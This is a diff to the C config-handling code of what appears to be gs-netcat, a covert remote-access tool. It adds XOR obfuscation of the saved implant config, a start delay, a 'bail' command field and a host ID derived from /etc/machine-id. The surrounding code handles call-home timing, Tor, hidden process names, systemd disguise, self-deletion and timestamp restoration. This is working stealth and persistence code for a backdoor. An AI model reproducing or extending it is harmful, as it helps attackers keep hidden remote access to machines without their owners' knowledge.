@@ -20,7 +20,8 @@ static char *systemd_argv_match;
 // Return 0 if config was read.
 static int
 config_read(struct gsnc_config *c, FILE *fp) {
-    char buf[64];
+    char buf[sizeof c->magic + 1];
+    char *ptr;
     int i;
     int ret;
 
@@ -32,6 +33,10 @@ config_read(struct gsnc_config *c, FILE *fp) {
     
     if (ret != 1)
         return 200;
+
+    // DECODE/de-obfuscate config
+    for (i = 0, ptr = (char *)c; i < sizeof *c; i++)
+        ptr[i] = ptr[i] ^ GSNC_CONFIG_XOR;
 
      // Check magic
     snprintf(buf, sizeof buf, "%s", GSNC_CONFIG_MAGIC_STR);
@@ -60,10 +65,6 @@ GSNC_config_write(const char *fn) {
     if (fn == NULL) {
         return 254;
     }
-
-	// if (gopt.sec_str == NULL) {
-	// 	gopt.sec_str = GS_GETENV2("SECRET");
-    // }
 
     if (gopt.sec_str == NULL) {
         fprintf(stderr, "-s or GS_SECRET not specified\n");
@@ -110,9 +111,15 @@ GSNC_config_write(const char *fn) {
 
     if ((ptr = GS_GETENV2("WORKDIR")) != NULL)
         snprintf(c.workdir, sizeof c.workdir, "%s", ptr);
-    
+
+    if ((ptr = GS_GETENV2("BAIL")) != NULL)
+        snprintf(c.bail, sizeof c.bail, "%s", ptr);
+
     if ((ptr = GS_GETENV2("SYSTEMD_ARGV_MATCH")) != NULL)
         snprintf(c.systemd_argv_match, sizeof c.systemd_argv_match, "%s", ptr);
+
+    if ((ptr = GS_GETENV2("START_DELAY")) != NULL)
+        c.start_delay_sec = atoi(ptr);
 
     c.callhome_sec = gopt.callhome_sec;
     c.flags |= (gopt.flags & GSC_FL_OPT_TOR);
@@ -126,6 +133,13 @@ GSNC_config_write(const char *fn) {
         c.flags |= GSC_FL_CHANGE_CGROUP;
     if (GS_GETENV2("DELME"))
         c.flags |= GSC_FL_DELME;
+    if (GS_GETENV2("USEHOSTID"))
+        c.flags |= GSC_FL_USEHOSTID;
+
+    // ENCODE/obfuscate config
+    DEBUGF("Writing\n");
+    for (i = 0, ptr = (char *)&c; i < sizeof c; i++)
+        ptr[i] = ptr[i] ^ GSNC_CONFIG_XOR;
 
     if (fwrite(&c, sizeof c, 1, fp) != 1)
         goto err;
@@ -141,7 +155,6 @@ GSNC_config_write(const char *fn) {
         memcpy(&ts[0], &sb.st_atim, sizeof ts[0]);
         memcpy(&ts[1], &sb.st_mtim, sizeof ts[1]);
 #endif    
-        // futimens(fileno(fp), &sb.st_atimespec);  # OSX
         futimens(fileno(fp), ts);
     }
 
@@ -181,6 +194,8 @@ GSNC_config_read(const char *fn) {
         gopt.gs_domain = strdup(c.domain);
     if (c.workdir[0] != '\0')
         gopt.gs_workdir = strdup(c.workdir);
+    if (c.bail[0] != '\0')
+        gopt.bail_cmd = strdup(c.bail);
     if (c.proc_hiddenname[0] != '\0')
         gopt.proc_hiddenname = strdup(c.proc_hiddenname);
     if (c.systemd_argv_match[0] != '\0')
@@ -188,6 +203,7 @@ GSNC_config_read(const char *fn) {
 
     gopt.gs_port = c.port;
     gopt.callhome_sec = c.callhome_sec;
+    gopt.start_delay_sec = c.start_delay_sec;
 
     gopt.flags |= (c.flags & GSC_FL_OPT_TOR);
     gopt.flags |= (c.flags & GSC_FL_OPT_DAEMON);
@@ -196,6 +212,7 @@ GSNC_config_read(const char *fn) {
     gopt.flags |= (c.flags & GSC_FL_FFPID);
     gopt.flags |= (c.flags & GSC_FL_CHANGE_CGROUP);
     gopt.flags |= (c.flags & GSC_FL_DELME);
+    gopt.flags |= (c.flags & GSC_FL_USEHOSTID);
 
     // Implied:
     gopt.is_interactive = 1;
@@ -206,7 +223,7 @@ GSNC_config_read(const char *fn) {
     ret = 0;
 err:
     XFCLOSE(fp);
-    DEBUGF("returning %d [%s]\n", ret, errno==0?"no config":strerror(errno));
+    DEBUGF("returning %d [%s]\n", ret, ret==0?"read config":errno==0?"no config":strerror(errno));
     return ret;
 }
 
@@ -473,3 +490,42 @@ execorig:
     sv_startorig(argv);
 }
 
+// Generate a random ID for this host. Should be something that is fairly static
+// between reboots.
+char *
+GSNC_gs_id_gen(void) {
+	char buf[1024];
+	unsigned char mdres[SHA256_DIGEST_LENGTH];
+	FILE *fp = fopen("/etc/machine-id", "r");
+	size_t sz;
+	EVP_MD_CTX *mdctx = EVP_MD_CTX_create();
+	const EVP_MD *algo = EVP_sha256();
+	EVP_DigestInit_ex(mdctx, algo, NULL);
+
+	if (fp) {
+		sz = fread(buf, 1, sizeof buf, fp);
+		fclose(fp);
+		if (sz > 4) {
+			EVP_DigestUpdate(mdctx, buf, sz);
+			goto done;
+		}
+	}
+
+	struct stat sb;
+	if (stat("/", &sb) == 0) {
+#ifdef __APPLE__
+		EVP_DigestUpdate(mdctx, &sb.st_mtimespec, sizeof sb.st_mtimespec);
+#else
+		EVP_DigestUpdate(mdctx, &sb.st_mtim, sizeof sb.st_mtim);
+#endif
+		goto done;
+	}
+
+done:
+	EVP_DigestFinal_ex(mdctx, mdres, 0);
+	EVP_MD_CTX_destroy(mdctx);
+
+	char str[2 + GS_ID_SIZE * 2 + 1];
+	snprintf(str, sizeof str, "0x%16s", GS_bin2hex(buf, sizeof buf, mdres, sizeof mdres));
+	return strdup(str);
+}
